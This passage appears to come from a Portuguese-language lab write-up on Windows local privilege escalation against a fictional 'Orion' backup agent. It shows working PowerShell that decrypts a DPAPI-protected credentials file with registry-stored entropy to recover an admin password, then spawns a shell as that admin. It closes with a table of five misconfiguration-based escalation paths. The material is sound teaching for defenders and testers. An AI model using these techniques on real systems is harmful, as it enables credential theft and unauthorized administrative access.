(machine scope)"**, ou seja, DPAPI com escopo `LocalMachine`.

### Exploração

A entropia é a string do `Seed` (bytes UTF-8); o escopo é `LocalMachine`. Decifra direto com a
API nativa do .NET, sem ferramenta externa:

```powershell
Add-Type -AssemblyName System.Security
$seed  = (Get-ItemProperty 'HKLM:\SOFTWARE\Orion\BackupAgent').Seed
$blob  = [IO.File]::ReadAllBytes('C:\ProgramData\Orion\Backup\credentials.bin')
$clear = [Security.Cryptography.ProtectedData]::Unprotect(
           $blob,
           [Text.Encoding]::UTF8.GetBytes($seed),
           [Security.Cryptography.DataProtectionScope]::LocalMachine)
[Text.Encoding]::UTF8.GetString($clear)
```

```text
PS C:\Users\analista> Add-Type -AssemblyName System.Security
PS C:\Users\analista> $seed  = (Get-ItemProperty 'HKLM:\SOFTWARE\Orion\BackupAgent').Seed
PS C:\Users\analista> $blob  = [IO.File]::ReadAllBytes('C:\ProgramData\Orion\Backup\credentials.bin')
PS C:\Users\analista> $clear = [Security.Cryptography.ProtectedData]::Unprotect(
>>            $blob, [Text.Encoding]::UTF8.GetBytes($seed),
>>            [Security.Cryptography.DataProtectionScope]::LocalMachine)
PS C:\Users\analista> [Text.Encoding]::UTF8.GetString($clear)
█████
PS C:\Users\analista>
```

Sai a senha do `orionadmin`. Autentique como ele:

```powershell
$sec  = Read-Host "Senha do orionadmin" -AsSecureString
$cred = New-Object System.Management.Automation.PSCredential('orionadmin', $sec)
Start-Process cmd.exe -Credential $cred
```

### Evidência

Na janela no contexto de `orionadmin`:

```cmd
whoami /groups
type "C:\ProgramData\Orion\vault\admin-proof.txt"
```

```text
C:\Windows\system32>whoami /groups

INFORMAÇÕES DE GRUPO
---------------------

Nome do grupo                                                  Tipo                     SID          Atributos          
============================================================== ======================== ============ ===========================================================================
Todos                                                          Grupo bastante conhecido S-1-1-0      Grupo obrigatório, Ativado por padrão, Grupo ativado
AUTORIDADE NT\Conta local e membro do grupo de Administradores Grupo bastante conhecido S-1-5-114    Grupo obrigatório, Ativado por padrão, Grupo ativado
BUILTIN\Administradores                                        Alias                    S-1-5-32-544 Grupo obrigatório, Ativado por padrão, Grupo ativado, Proprietário do grupo
BUILTIN\Usuários                                               Alias                    S-1-5-32-545 Grupo obrigatório, Ativado por padrão, Grupo ativado
AUTORIDADE NT\INTERATIVO                                       Grupo bastante conhecido S-1-5-4      Grupo obrigatório, Ativado por padrão, Grupo ativado
LOGON de CONSOLE                                               Grupo bastante conhecido S-1-2-1      Grupo obrigatório, Ativado por padrão, Grupo ativado
AUTORIDADE NT\Usuários autenticados                            Grupo bastante conhecido S-1-5-11     Grupo obrigatório, Ativado por padrão, Grupo ativado
AUTORIDADE NT\Esta organização                                 Grupo bastante conhecido S-1-5-15     Grupo obrigatório, Ativado por padrão, Grupo ativado
AUTORIDADE NT\Conta local                                      Grupo bastante conhecido S-1-5-113    Grupo obrigatório, Ativado por padrão, Grupo ativado
LOCAL                                                          Grupo bastante conhecido S-1-2-0      Grupo obrigatório, Ativado por padrão, Grupo ativado
AUTORIDADE NT\Autenticação NTLM                                Grupo bastante conhecido S-1-5-64-10  Grupo obrigatório, Ativado por padrão, Grupo ativado
Rótulo Obrigatório\Nível Obrigatório Alto                      Rótulo                   S-1-16-12288                    

C:\Windows\system32>type "C:\ProgramData\Orion\vault\admin-proof.txt"
Orion administrative vault

C:\Windows\system32>
```

`orionadmin` é membro de `Administradores` e lê o cofre `admin-proof.txt`, inacessível ao
`analista`.

**Referência:** [DataProtectionScope (Microsoft Learn)](https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.dataprotectionscope) · [MITRE ATT&CK T1555: Credentials from Password Stores](https://attack.mitre.org/techniques/T1555/)

---

## Resumo

| # | Vetor | Falha | Técnica | Resultado |
|---|-------|-------|---------|-----------|
| W1 | Serviço `OrionMaintenance` | DACL do serviço dá `CHANGE_CONFIG` a Usuários | reconfigurar `binPath` + reiniciar | SYSTEM → `analista` em Administradores |
| W2 | Registro `LegacySupport` | senha de `admin2` em texto claro | ler a chave e autenticar | sessão de `admin2` (admin) |
| W3 | Tarefa `\Orion\DllCheck` | DLL gravável carregada por tarefa SYSTEM | substituir os bytes da DLL + disparar | SYSTEM → `analista` em Administradores |
| W4 | `AlwaysInstallElevated` | política ligada em HKLM, HKCU aberto ao usuário | completar HKCU + instalar MSI | SYSTEM → `analista` em Administradores |
| W5 | Blob DPAPI `credentials.bin` | escopo `LocalMachine` + entropia legível | decifrar e autenticar | sessão de `orionadmin` (admin) |

**Lição comum:** nenhum dos cinco caminhos é um *exploit* de vulnerabilidade de código: todos
são **erros de configuração** (ACL frouxa, segredo exposto, política perigosa, escopo de
proteção errado). É o pão com manteiga da elevação de privilégios local no Windows: enumerar
com ferramentas nativas, entender *quem pode mexer em quê*, e transformar uma permissão de
escrita num contexto privilegiado de execução.
